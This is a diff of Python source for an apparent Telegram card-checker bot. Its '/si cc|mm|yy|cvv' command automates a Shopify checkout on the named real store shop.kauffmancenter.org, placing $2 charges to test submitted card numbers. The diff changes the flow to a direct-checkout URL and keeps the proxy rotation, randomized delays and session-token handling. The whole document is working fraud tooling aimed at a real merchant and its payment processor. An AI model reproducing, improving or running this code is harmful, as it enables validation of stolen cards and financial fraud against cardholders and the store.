@@ -118,7 +118,7 @@ class ShopifyLogger:
    ├── User ID: {self.user_id or 'N/A'}
    ├── Card: {masked_cc}
    ├── Start Time: {datetime.now().strftime('%H:%M:%S')}
-   └── Target: shop.kauffmancenter.org (Postcard x2)
+   └── Target: shop.kauffmancenter.org (Postcard x2 - Direct Checkout)
         """
         self.add_log(log_msg)
         print(log_msg)
@@ -647,7 +647,9 @@ class ShopifyKauffmanCheckout:
         self.user_id = user_id
         self.base_url = "https://shop.kauffmancenter.org"
         self.product_handle = "kauffman-center-postcard"
-        self.product_url = f"{self.base_url}/products/{self.product_handle}"
+        
+        # Direct checkout URL with quantity=2 pre-added
+        self.direct_checkout_url = f"{self.base_url}/cart/{self.product_handle}:2"
         
         # Proxy management
         self.proxy_url = None
@@ -787,96 +789,16 @@ class ShopifyKauffmanCheckout:
         timestamp = self.generate_timestamp()
         return f"{self.checkout_token}-{timestamp}"
 
-    async def get_product_page(self):
-        """Step 1: Get product page to get initial cookies"""
-        self.step(1, "GET PRODUCT PAGE", f"Loading Kauffman Center postcard product page")
+    async def direct_checkout_access(self):
+        """Step 1: Directly access checkout with product pre-added"""
+        self.step(1, "DIRECT CHECKOUT", f"Accessing checkout directly with 2 x Postcard")
         
         try:
-            resp = await self.client.get(self.product_url, headers=self.headers, timeout=25, follow_redirects=True)
+            resp = await self.client.get(self.direct_checkout_url, headers=self.headers, timeout=25, follow_redirects=True)
             
             if resp.status_code != 200:
-                self.logger.error_log("PRODUCT_PAGE", f"Failed: {resp.status_code}")
-                return False, f"Failed to load product page: {resp.status_code}"
-            
-            return True, resp.text
-            
-        except httpx.ProxyError as e:
-            self.logger.error_log("PROXY", f"Proxy error on product page: {str(e)}")
-            mark_proxy_failed(self.proxy_url)
-            self.proxy_status = "Dead 🚫"
-            return False, "PROXY_DEAD"
-        except httpx.TimeoutException as e:
-            self.logger.error_log("TIMEOUT", f"Timeout on product page: {str(e)}")
-            return False, "TIMEOUT"
-        except Exception as e:
-            self.logger.error_log("PRODUCT_PAGE", str(e))
-            return False, f"Product page error: {str(e)[:50]}"
-
-    async def add_to_cart(self):
-        """Step 2: Add 2 units of postcard to cart"""
-        self.step(2, "ADD TO CART", "Adding 2 x Kauffman Center Postcard (2.00$ total)")
-        
-        cart_headers = {
-            **self.headers,
-            'referer': self.product_url,
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': self.base_url,
-            'sec-fetch-site': 'same-origin'
-        }
-        
-        # Add to cart with quantity 2
-        cart_data = {
-            'id': self.variant_id,
-            'quantity': '2'
-        }
-        
-        try:
-            resp = await self.client.post(
-                f"{self.base_url}/cart/add.js",
-                headers=cart_headers,
-                data=cart_data,
-                timeout=25,
-                follow_redirects=True
-            )
-            
-            if resp.status_code != 200:
-                return False, f"Add to cart failed: {resp.status_code}"
-            
-            self.logger.data_extracted("Cart", "2 x Postcard added", "Success")
-            return True, resp.text
-            
-        except httpx.ProxyError as e:
-            self.logger.error_log("PROXY", f"Proxy error on add to cart: {str(e)}")
-            mark_proxy_failed(self.proxy_url)
-            self.proxy_status = "Dead 🚫"
-            return False, "PROXY_DEAD"
-        except httpx.TimeoutException as e:
-            self.logger.error_log("TIMEOUT", f"Timeout on add to cart: {str(e)}")
-            return False, "TIMEOUT"
-        except Exception as e:
-            self.logger.error_log("ADD_TO_CART", str(e))
-            return False, f"Add to cart error: {str(e)[:50]}"
-
-    async def get_checkout_token(self):
-        """Step 3: Get checkout token by proceeding to checkout"""
-        self.step(3, "GET CHECKOUT TOKEN", "Obtaining checkout token")
-        
-        checkout_headers = {
-            **self.headers,
-            'referer': self.product_url,
-            'sec-fetch-site': 'same-origin'
-        }
-        
-        try:
-            # Proceed to checkout
-            checkout_url = f"{self.base_url}/checkout"
-            
-            resp = await self.client.get(
-                checkout_url,
-                headers=checkout_headers,
-                follow_redirects=True,
-                timeout=25
-            )
+                self.logger.error_log("CHECKOUT_PAGE", f"Failed: {resp.status_code}")
+                return False, f"Failed to access checkout: {resp.status_code}"
             
             # Get final URL from redirects
             current_url = str(resp.url)
@@ -889,11 +811,15 @@ class ShopifyKauffmanCheckout:
                     self.checkout_token = body_token
             
             if self.checkout_token:
-                self.logger.data_extracted("Checkout Token", self.checkout_token[:15] + "...", "Checkout URL")
+                self.logger.data_extracted("Checkout Token", self.checkout_token[:15] + "...", "Direct Checkout URL")
                 
                 # Construct GraphQL session token
                 self.graphql_session_token = self.construct_graphql_session_token()
                 self.logger.data_extracted("GraphQL Session Token", self.graphql_session_token, "Constructed")
+                
+                # Generate stable ID for merchandise line
+                self.stable_id = self.generate_uuid()
+                self.logger.data_extracted("Stable ID", self.stable_id, "Generated")
                 
                 return True, current_url
             else:
@@ -901,24 +827,24 @@ class ShopifyKauffmanCheckout:
                 return False, "CHECKOUT_TOKEN_ERROR"
                 
         except httpx.ProxyError as e:
-            self.logger.error_log("PROXY", f"Proxy error on checkout token: {str(e)}")
+            self.logger.error_log("PROXY", f"Proxy error on direct checkout: {str(e)}")
             mark_proxy_failed(self.proxy_url)
             self.proxy_status = "Dead 🚫"
             return False, "PROXY_DEAD"
         except httpx.TimeoutException as e:
-            self.logger.error_log("TIMEOUT", f"Timeout on checkout token: {str(e)}")
+            self.logger.error_log("TIMEOUT", f"Timeout on direct checkout: {str(e)}")
             return False, "TIMEOUT"
         except Exception as e:
-            self.logger.error_log("CHECKOUT_TOKEN", str(e))
-            return False, f"Checkout token error: {str(e)[:50]}"
+            self.logger.error_log("DIRECT_CHECKOUT", str(e))
+            return False, f"Direct checkout error: {str(e)[:50]}"
 
     async def get_session_token(self):
-        """Step 4: Extract session token from checkout page"""
-        self.step(4, "GET SESSION TOKEN", "Extracting session token")
+        """Step 2: Extract session token from checkout page"""
+        self.step(2, "GET SESSION TOKEN", "Extracting session token")
         
         checkout_headers = {
             **self.headers,
-            'referer': self.product_url,
+            'referer': self.direct_checkout_url,
             'sec-fetch-site': 'same-origin'
         }
         
@@ -955,8 +881,8 @@ class ShopifyKauffmanCheckout:
             return False, f"Session token error: {str(e)[:50]}"
 
     async def submit_proposal(self):
-        """Step 5: Submit initial proposal"""
-        self.step(5, "SUBMIT PROPOSAL", "Initiating checkout proposal")
+        """Step 3: Submit initial proposal"""
+        self.step(3, "SUBMIT PROPOSAL", "Initiating checkout proposal")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
         
@@ -980,9 +906,6 @@ class ShopifyKauffmanCheckout:
         
         if self.session_token:
             graphql_headers['x-checkout-one-session-token'] = self.session_token
-        
-        # Generate stable ID for merchandise line
-        self.stable_id = self.generate_uuid()
         
         # Variables based on captured Proposal request
         variables = {
@@ -1169,8 +1092,8 @@ class ShopifyKauffmanCheckout:
             return False, f"Proposal error: {str(e)[:50]}"
 
     async def update_contact_info(self):
-        """Step 6: Update contact information with email"""
-        self.step(6, "UPDATE CONTACT", f"Setting email: {self.email}")
+        """Step 4: Update contact information with email"""
+        self.step(4, "UPDATE CONTACT", f"Setting email: {self.email}")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
         
@@ -1354,8 +1277,8 @@ class ShopifyKauffmanCheckout:
             return False, f"Contact update error: {str(e)[:50]}"
 
     async def select_pickup_delivery(self):
-        """Step 7: Select pickup delivery method (Kauffman Center location)"""
-        self.step(7, "SELECT PICKUP", "Choosing Kauffman Center pickup location")
+        """Step 5: Select pickup delivery method (Kauffman Center location)"""
+        self.step(5, "SELECT PICKUP", "Choosing Kauffman Center pickup location")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
         
@@ -1538,8 +1461,8 @@ class ShopifyKauffmanCheckout:
             return False, f"Pickup selection error: {str(e)[:50]}"
 
     async def create_payment_session(self, cc, mes, ano, cvv):
-        """Step 8: Create payment session with PCI"""
-        self.step(8, "CREATE PAYMENT", "Creating payment session with PCI")
+        """Step 6: Create payment session with PCI"""
+        self.step(6, "CREATE PAYMENT", "Creating payment session with PCI")
         
         pci_headers = {
             'authority': 'checkout.pci.shopifyinc.com',
@@ -1630,8 +1553,8 @@ class ShopifyKauffmanCheckout:
             return False, "PCI_ERROR"
 
     async def update_billing_address(self, payment_session_id):
-        """Step 9: Update billing address with pickup location address"""
-        self.step(9, "UPDATE BILLING", f"Setting billing address: {self.address['address1']}, {self.address['city']}, {self.address['provinceCode']} {self.address['zip']}")
+        """Step 7: Update billing address with pickup location address"""
+        self.step(7, "UPDATE BILLING", f"Setting billing address: {self.address['address1']}, {self.address['city']}, {self.address['provinceCode']} {self.address['zip']}")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
         
@@ -1860,8 +1783,8 @@ class ShopifyKauffmanCheckout:
             return False, f"Billing update error: {str(e)[:50]}"
 
     async def submit_for_completion(self, payment_session_id):
-        """Step 10: Submit for completion - final payment"""
-        self.step(10, "SUBMIT PAYMENT", "Finalizing payment of 2.00$")
+        """Step 8: Submit for completion - final payment"""
+        self.step(8, "SUBMIT PAYMENT", "Finalizing payment of 2.00$")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
         
@@ -2104,7 +2027,7 @@ class ShopifyKauffmanCheckout:
                 
                 if receipt_type == 'ProcessingReceipt':
                     poll_delay = receipt.get('pollDelay', 500) / 1000
-                    self.step(11, "POLL RECEIPT", f"Waiting {poll_delay}s", f"Delay: {poll_delay}s", "WAIT")
+                    self.step(9, "POLL RECEIPT", f"Waiting {poll_delay}s", f"Delay: {poll_delay}s", "WAIT")
                     await asyncio.sleep(poll_delay)
                     return await self.poll_receipt(graphql_headers)
                     
@@ -2135,8 +2058,8 @@ class ShopifyKauffmanCheckout:
             return False, f"Submit error: {str(e)[:50]}"
 
     async def poll_receipt(self, headers, max_polls=5):
-        """Step 12: Poll for receipt status"""
-        self.step(12, "POLL RECEIPT", "Polling for payment status")
+        """Step 10: Poll for receipt status"""
+        self.step(10, "POLL RECEIPT", "Polling for payment status")
         
         graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
         poll_attempts = 0
@@ -2182,7 +2105,7 @@ class ShopifyKauffmanCheckout:
                 
                 if resp.status_code != 200:
                     if poll_attempts < max_attempts:
-                        self.logger.step(12, "POLL RECEIPT RETRY", f"Attempt {poll_attempts} failed, retrying...", f"Status: {resp.status_code}", "WAIT")
+                        self.logger.step(10, "POLL RECEIPT RETRY", f"Attempt {poll_attempts} failed, retrying...", f"Status: {resp.status_code}", "WAIT")
                         await asyncio.sleep(base_delay * poll_attempts)
                         continue
                     return False, f"Poll failed after {max_attempts} attempts"
@@ -2206,7 +2129,7 @@ class ShopifyKauffmanCheckout:
                         if poll_attempts < max_attempts:
                             poll_delay = receipt_data.get('pollDelay', 500) / 1000
                             wait_time = max(poll_delay, base_delay * poll_attempts)
-                            self.step(12, "POLL RECEIPT", f"Still processing, attempt {poll_attempts}/{max_attempts}", f"Waiting {wait_time:.1f}s", "WAIT")
+                            self.step(10, "POLL RECEIPT", f"Still processing, attempt {poll_attempts}/{max_attempts}", f"Waiting {wait_time:.1f}s", "WAIT")
                             await asyncio.sleep(wait_time)
                             continue
                         else:
@@ -2221,14 +2144,14 @@ class ShopifyKauffmanCheckout:
                         
                 except Exception as e:
                     if poll_attempts < max_attempts:
-                        self.logger.step(12, "POLL RECEIPT RETRY", f"Parse error, retrying...", str(e)[:50], "WAIT")
+                        self.logger.step(10, "POLL RECEIPT RETRY", f"Parse error, retrying...", str(e)[:50], "WAIT")
                         await asyncio.sleep(base_delay)
                         continue
                     return False, f"Failed to parse poll response: {str(e)[:50]}"
                     
             except httpx.TimeoutException as e:
                 if poll_attempts < max_attempts:
-                    self.logger.step(12, "POLL RECEIPT RETRY", f"Timeout on attempt {poll_attempts}, retrying...", "", "WAIT")
+                    self.logger.step(10, "POLL RECEIPT RETRY", f"Timeout on attempt {poll_attempts}, retrying...", "", "WAIT")
                     await asyncio.sleep(base_delay)
                     continue
                 self.logger.error_log("TIMEOUT", f"Timeout on poll after {max_attempts} attempts")
@@ -2236,7 +2159,7 @@ class ShopifyKauffmanCheckout:
                 
             except Exception as e:
                 if poll_attempts < max_attempts:
-                    self.logger.step(12, "POLL RECEIPT RETRY", f"Error on attempt {poll_attempts}, retrying...", str(e)[:50], "WAIT")
+                    self.logger.step(10, "POLL RECEIPT RETRY", f"Error on attempt {poll_attempts}, retrying...", str(e)[:50], "WAIT")
                     await asyncio.sleep(base_delay)
                     continue
                 return False, f"Poll error: {str(e)[:50]}"
@@ -2244,7 +2167,7 @@ class ShopifyKauffmanCheckout:
         return False, "DECLINED - TIMEOUT"
 
     async def execute_checkout(self, cc, mes, ano, cvv):
-        """Main checkout execution flow for Kauffman Center postcard"""
+        """Main checkout execution flow for Kauffman Center postcard using direct checkout"""
         try:
             # Step 0: Get proxy
             self.step(0, "GET PROXY", "Getting proxy")
@@ -2263,61 +2186,49 @@ class ShopifyKauffmanCheckout:
                 self.proxy_status = "No Proxy"
                 self.client = httpx.AsyncClient(timeout=25, follow_redirects=True)
             
-            # Step 1: Get product page
-            success, result = await self.get_product_page()
+            # Step 1: Direct checkout access (skips product page and add to cart)
+            success, result = await self.direct_checkout_access()
             if not success:
                 return False, result
             await self.random_delay(0.3, 0.5)
             
-            # Step 2: Add 2 units to cart
-            success, result = await self.add_to_cart()
-            if not success:
-                return False, result
-            await self.random_delay(0.3, 0.5)
-            
-            # Step 3: Get checkout token
-            success, result = await self.get_checkout_token()
-            if not success:
-                return False, result
-            await self.random_delay(0.3, 0.5)
-            
-            # Step 4: Get session token
+            # Step 2: Get session token
             success, result = await self.get_session_token()
             if not success:
                 return False, result
             await self.random_delay(0.3, 0.5)
             
-            # Step 5: Submit proposal
+            # Step 3: Submit proposal
             success, result = await self.submit_proposal()
             if not success:
                 return False, result
             await self.random_delay(0.3, 0.5)
             
-            # Step 6: Update contact with email
+            # Step 4: Update contact with email
             success, result = await self.update_contact_info()
             if not success:
                 return False, result
             await self.random_delay(0.3, 0.5)
             
-            # Step 7: Select pickup delivery
+            # Step 5: Select pickup delivery
             success, result = await self.select_pickup_delivery()
             if not success:
                 return False, result
             await self.random_delay(0.3, 0.5)
             
-            # Step 8: Create payment session
+            # Step 6: Create payment session
             success, payment_session_id = await self.create_payment_session(cc, mes, ano, cvv)
             if not success:
                 return False, payment_session_id
             await self.random_delay(0.3, 0.5)
             
-            # Step 9: Update billing address
+            # Step 7: Update billing address
             success, result = await self.update_billing_address(payment_session_id)
             if not success:
                 return False, result
             await self.random_delay(0.3, 0.5)
             
-            # Step 10: Submit for completion
+            # Step 8: Submit for completion
             success, result = await self.submit_for_completion(payment_session_id)
             
             return success, result
@@ -2459,7 +2370,7 @@ async def handle_shopify_kauffman(client: Client, message: Message):
 🠪 <b>Usage</b>: <code>/si cc|mm|yy|cvv</code>
 🠪 <b>Example</b>: <code>/si 4111111111111111|12|2030|123</code>
 ━━━━━━━━━━━━━
-<b>~ Note:</b> <code>Shopify Charge 2$</code>""")
+<b>~ Note:</b> <code>Shopify Charge 2$ - Direct Checkout</code>""")
             return
 
         # Get the full message text after the command
@@ -2489,7 +2400,7 @@ async def handle_shopify_kauffman(client: Client, message: Message):
 <b>[#Shopify Charge 2.00$] | WAYNE</b> ✦
 ━━━━━━━━━━━━━━━
 <b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
-<b>[•] Gateway</b> - <b>Shopify Charge 2.00$</b>
+<b>[•] Gateway</b> - <b>Shopify Charge 2.00$ (Direct)</b>
 <b>[•] Status</b>- <code>Processing...</code>
 <b>[•] Response</b>- <code>Initiating...</code>
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
@@ -2547,7 +2458,7 @@ async def handle_shopify_kauffman(client: Client, message: Message):
                     f"""<pre>❌ Processing Error</pre>
 ━━━━━━━━━━━━━
 🠪 <b>Message</b>: Error processing Shopify charge.
-🠪 <b>Error</b>: <code>{str(e)[:100]}</code>
+🠪 <b>Error</b>: `{str(e)[:100]}`
 🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
 ━━━━━━━━━━━━━"""
                 )
@@ -2560,4 +2471,3 @@ async def handle_shopify_kauffman(client: Client, message: Message):
 🠪 <b>Error</b>: <code>{error_msg}</code>
 🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
 ━━━━━━━━━━━━━""")
-
